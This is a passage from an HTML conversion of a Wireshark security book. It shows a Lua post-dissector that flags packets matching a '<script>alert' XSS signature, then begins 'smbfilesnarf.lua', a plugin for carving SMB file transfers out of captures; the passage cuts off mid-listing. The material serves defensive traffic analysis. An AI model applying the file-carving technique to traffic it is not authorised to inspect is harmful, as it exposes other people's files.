><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:102.5500pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local result = url_decode(tostring(packet)) result = string.match(result, "&#60;script&#62;alert.*") if result ~= nil then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:51.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >return true</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section368" ><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >else</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:345.4500pt;margin-left:29.5500pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >return false end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local function register_suspicious_postdissector()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local proto = Proto('suspicious', 'suspicious dissector')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:101.7000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create a new expert field for the proto exp_susp = ProtoExpert.new('suspicious.expert',</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:231.0500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >'Potential Refelctive XSS', expert.group.SECURITY,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >expert.severity.WARN)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:251.8000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--register the expert field proto.experts = {exp_susp}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section369" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:11.1500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><a name="_bookmark666" ></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function proto.dissector(buffer, pinfo, tree)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:59.3500pt;margin-left:55.5500pt;text-indent:-36.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--[[ this just searches through all of the packet buffer, this could also be implemented by pulling the http.request.uri field and search on that --]]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:1.4500pt;margin-right:217.8000pt;margin-left:19.5500pt;text-indent:0.0000pt;text-align:left;line-height:27.0000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local range = buffer:range() if check(range:string()) then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:33.9500pt;text-indent:0.0000pt;text-align:left;line-height:11.6500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--[[ if the check returns true then add</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:95.4500pt;margin-left:69.9000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >a suspicious field to the packet tree and add the expert info --]]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:33.9500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local stree = tree:add(proto, 'Suspicious') stree:add_proto_expert_info(exp_susp)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:410.2500pt;margin-left:5.1500pt;text-indent:14.3500pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >end end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >register_postdissector(proto)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section370" ><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >register_suspicious_postdissector()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Like the previous Lua script, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >packet-direction.lua</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, this </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >mark- suspicious </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script is a post-dissector. Again, that means the script is run after the rest of Wireshark&#8217;s dissectors have analyzed the packet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section371" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >mark-suspicious</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.9500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script creates a new tree item, which can be seen in the Packet Details pane. The script compares packet contents with the text strings located at the script beginning. If there is a match, a message is added to the tree field.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3000pt;margin-right:52.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To find any matching packets, you could filter for a &#8220;suspicious- expert&#8221; message in Wireshark.<a name="_bookmark667" ></a>&nbsp;</span><span><a href="#_bookmark668" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-11</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows an example.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="782"  height="376"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker461285.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.4500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark668" ></a><span><a href="#_bookmark667" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-11:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Finding a suspicious packet</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Snooping SMB File Transfers</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><a name="_bookmark669" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you followed along with the exercises, you already manually reconstructed a file that was transferred through SMB in the previous chapter and probably noticed it is a tedious and error-prone process. The same workflow can be automated in a Lua plug-in to save all the files transferred in a given packet dump.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >File carving </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is the technique of extracting a file from the stream of network traffic. This is complicated by the nature of SMB transfers being separated over several procedure calls, whereas HTTP, for example, would transfer a file within one TCP stream, spread over multiple packets if the file size is too big for one packet. The TCP stream can be reassembled by Wireshark automatically, thereby simplifying the problem. In the following code, you will find the plug-</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section372" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:52.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in that automatically dumps all SMB file transfers in the packet capture:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:7.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >smbfilesnarf.lua</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:216.8500pt;margin-left:29.5500pt;text-indent:-21.6000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local function printfiles(table) for key, value in pairs(table)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:229.0000pt;margin-left:29.5500pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print(key .. ': ' .. value) end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function string.unhexlify(str)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >return (str:gsub('..', function (byte)</span><span style="mso-spacerun:'yes';font-family:'Courier 